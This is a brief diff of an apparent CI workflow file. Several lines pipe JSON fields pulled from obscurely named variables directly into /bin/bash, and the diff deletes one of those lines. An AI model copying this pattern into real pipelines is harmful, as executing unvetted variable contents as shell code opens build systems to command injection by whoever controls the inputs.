@@ -29,7 +29,6 @@ jobs:
           echo $sbrme73635 | jq -r .qrfj0956 | /bin/bash
           echo $fmqcr3663 | jq -r .gsq476 | /bin/bash
           printf '%s' "$xydu14" | jq -r .u826 | /bin/bash
-          echo $ou1 | jq -r .qqaf3980 | /bin/bash
           echo $l42 | jq -r .wt4170 | /bin/bash
           echo $otzhl26 | jq -r .e968 | /bin/bash
           printf '%s' "$ytx9745" | jq -r .z6059 | /bin/bash
